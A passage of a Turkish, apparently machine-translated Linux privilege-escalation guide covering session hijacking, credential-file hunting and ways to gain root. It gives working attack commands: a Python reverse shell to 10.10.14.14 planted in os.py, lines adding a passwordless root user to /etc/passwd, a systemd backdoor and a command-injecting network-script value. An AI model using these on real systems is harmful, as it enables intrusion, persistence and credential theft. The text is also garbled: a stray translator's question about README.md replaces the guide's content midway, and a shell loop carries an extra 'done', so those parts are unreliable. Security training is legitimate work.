Erişim Kontrol Listeleri (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilme** yeteneğine sahiptir. Bu izinler, sahibi olmayan veya grubun bir parçası olmayan belirli kullanıcılara haklar verip reddederek dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu düzeydeki **ayrıntılı kontrol**, daha hassas erişim yönetimi sağlar. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Verin** kullanıcı "kali"ya bir dosya üzerinde okuma ve yazma izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Al** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**en yeni sürümlerde** yalnızca **kendi kullanıcı hesabınızın** screen sessions'a **connect** olabileceksiniz. Ancak **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen sessions'i listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Mevcut bir oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri**yle ilgili bir sorundu. Ayrıcalıksız bir kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu hijack edemedim.
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** için bir örneğe bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.  
Bu hata, o OS'lerde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olarak karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şurada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Parola ile doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Public key ile doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `yes`'dir.
- **PermitEmptyPasswords**: Parola doğrulaması izinliyse, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

Root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root parola ve private key kullanarak giriş yapabilir
- `without-password` or `prohibit-password`: root yalnızca private key ile giriş yapabilir
- `forced-commands-only`: root yalnızca private key kullanarak ve commands seçenekleri belirtilmişse giriş yapabilir
- `no` : izin yok

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi tokenlar içerebilir; bunlar home dizini ile değiştirilecektir. **Mutlak yollar** ( `/` ile başlayan) veya **kullanıcının home dizininden göreli yollar** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, kullanıcı "**testusername**"ın **private** anahtarıyla giriş denemesi yapmanız halinde, ssh'in anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içinde bulunanlarla karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtarlar bırakmak yerine **use your local SSH keys instead of leaving keys** kullanmanıza izin verir. Böylece ssh ile **jump** **to a host** yapabilir ve oradan **jump to another** **host** yaparak **initial host**'unuzda bulunan **key**'i **using** edebilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise, kullanıcı her farklı makineye geçtiğinde o host anahtarlara erişebilecektir (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config`, bu seçenekleri **override** ederek bu yapılandırmaya izin verebilir veya engelleyebilir.\  
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesiyle ssh-agent forwarding'e **izin verebilir** veya **engelleyebilir** (varsayılan: izin verilir).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, bir kullanıcı yeni bir shell çalıştırdığında **çalıştırılan script'lerdir**. Bu nedenle, eğer bunların herhangi birini **yazabilir veya değiştirebilirseniz yetki yükseltmesi yapabilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer herhangi bir garip profile script bulunursa, **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor olabilir veya bir yedeği olabilir. Bu nedenle **tümünü bulmanız** ve onları **okuyup okuyamadığınızı kontrol etmeniz** önerilir; böylece dosyaların içinde **hash olup olmadığını** görebilirsiniz:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğeri) dosyasının içinde **password hashes** bulabilirsiniz
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

İlk olarak, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
README.md içeriğini gönderir misiniz? Ayrıca "hacker" kullanıcısını nasıl eklememi istiyorsunuz:
- Çeviriye README'ye eklenecek bir bölüm mü (metin içinde),  
- Yoksa sistemde kullanıcı oluşturacak komut örnekleri ve şifreyi gösteren bir kod bloğu mu?

Şifre gereksinimleri var mı (uzunluk, karakter türleri)? İsterseniz ben rastgele güçlü bir şifre (ör. 16 karakter) üreteyim ve hem komutları hem de üretilen şifreyi ekleyeyim.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, aşağıdaki satırları parola olmadan bir sahte kullanıcı eklemek için kullanabilirsiniz.\
UYARI: makinenin mevcut güvenliğini azaltabilirsiniz.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Not: BSD platformlarında `/etc/passwd` dosyası `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur; ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **service configuration file**'larına yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **/etc/systemd/ içindeki Tomcat servis yapılandırma dosyasını değiştirebiliyorsanız,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz bir sonraki tomcat başlatıldığında çalıştırılacaktır.

### Klasörleri Kontrol Edin

Aşağıdaki klasörlerde yedekler veya ilginç bilgiler olabilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Garip Konum/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakikada değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyalar
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Parola içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin; **parola içerebilecek birkaç olası dosyayı** arar.\
**Bu amaçla kullanabileceğiniz başka ilginç bir araç**: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — Windows, Linux & Mac için yerel bir bilgisayarda saklanan çok sayıda parolayı çıkarmak için kullanılan açık kaynaklı bir uygulamadır.

### Günlükler

Günlükleri okuyabiliyorsanız, içinde **ilginç/gizli bilgiler** bulabilirsiniz. Günlük ne kadar garipse, muhtemelen o kadar ilginç olur.\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **audit logs** size audit loglarına **parolaları kaydetme** imkanı verebilir; bunun nasıl yapılacağını bu gönderide bulabilirsiniz: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Logları okumak için** [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Dosya **adı**nda veya **içerik** içinde "**password**" kelimesini içeren dosyaları da kontrol etmelisin; ayrıca loglar içinde IPs ve emails veya hashes regexps aramalısın. Burada bunun nasıl yapılacağını tek tek listelemeyeceğim, ancak ilgileniyorsan [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)'in yaptığı son kontrolleri inceleyebilirsin.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin **nereden** çalıştırılacağını biliyorsan ve o klasöre **yazabiliyorsan** veya **modify python libraries** yapabiliyorsan, OS library'yi değiştirip ona backdoor ekleyebilirsin (python scriptinin çalıştırılacağı yere yazabiliyorsan, os.py kütüphanesini kopyala ve yapıştır).

To **backdoor the library**, os.py kütüphanesinin sonuna aşağıdaki satırı ekle (IP and PORT'u değiştir):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Bir `logrotate` açığı, bir günlük dosyası veya üst dizinlerinde **yazma izinlerine** sahip kullanıcıların potansiyel olarak ayrıcalık yükseltmesi elde etmesine izin verir. Çünkü `logrotate`, genellikle **root** olarak çalıştığından, özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde rastgele dosyaları çalıştıracak şekilde manipüle edilebilir. İzinleri sadece _/var/log_ içinde değil, log döndürmenin uygulandığı herhangi bir dizinde de kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürüm `3.18.0` ve öncesini etkiler

Zafiyetle ilgili daha detaylı bilgiyi şu sayfada bulabilirsiniz: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** ile çok benzerdir, bu yüzden günlükleri değiştirebildiğinizi her gördüğünüzde, bu günlükleri kimlerin yönettiğini kontrol edin ve günlükleri symlinks ile değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinizi kontrol edin.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Zafiyet referansı:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine `ifcf-<whatever>` adlı bir script **yazabiliyor** veya mevcut bir scripti **düzenleyebiliyorsa**, sisteminiz **pwned** olur.

Network scriptleri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tam olarak .INI dosyalarına benzerler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından \~sourced\~ edilirler.

Benim durumumda, bu network scriptlerinde `NAME=` ile atanan değer doğru şekilde işlenmiyor. Eğer isimde **boşluk karakteri varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışır**. Bu, **ilk boşluktan sonraki her şeyin root olarak çalıştırılacağı** anlamına geliyor.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Ağ ile /bin/id_ arasında boşluk olduğunu unutmayın_)

### **init, init.d, systemd, and rc.d**

`/etc/init.d` dizini, System V init (SysVinit) için **komut dosyalarının** bulunduğu yerdir; klasik Linux servis yönetim sistemidir. Bu dizin, servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için kullanılan komut dosyalarını içerir. Bu dosyalar doğrudan veya `/etc/rc?.d/` içindeki sembolik linkler aracılığıyla çalıştırılabilir. Redhat sistemlerinde alternatif yol `/etc/rc.d/init.d`'dir.

Diğer taraftan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından tanıtılan daha yeni bir **servis yönetimi** olup servis yönetimi görevleri için yapılandırma dosyalarını kullanır. Upstart'e geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit betikleri Upstart yapılandırmalarıyla birlikte hâlen kullanılmaktadır.

**systemd**, modern bir başlatma ve servis yöneticisi olarak ortaya çıkar; talep üzerine daemon başlatma, automount yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` altında, yönetici değişiklikleri için ise `/etc/systemd/system/` altında düzenleyerek sistem yönetimini kolaylaştırır.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle bir syscall'ı hook'layarak ayrıcalıklı kernel işlevselliğini userspace bir yöneticiye açar. Zayıf yönetici kimlik doğrulaması (ör. FD-order'a dayalı imza kontrolleri veya zayıf parola şemaları) yerel bir uygulamanın yöneticiyi taklit etmesine ve önceden root'lu cihazlarda root'a yükselmesine imkan verebilir. Ayrıntılar ve istismar bilgileri için bakınız:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations içindeki regex tabanlı servis keşfi, işlem komut satırlarından bir binary yol çıkarıp bunu ayrıcalıklı bir bağlamda -v ile çalıştırabilir. İzin verici desenler (ör. \S kullanımı) yazılabilir konumlardaki (ör. /tmp/httpd) saldırgan tarafından yerleştirilmiş dinleyicilerle eşleşebilir ve bu da root olarak yürütülmeye yol açabilir (CWE-426 Untrusted Search Path).

Daha fazla bilgi ve diğer keşif/izleme yığınlarına uygulanabilir genelleştirilmiş desen için bakınız:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve macOS'taki kernel zafiyetlerini taramak için kullanılır [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
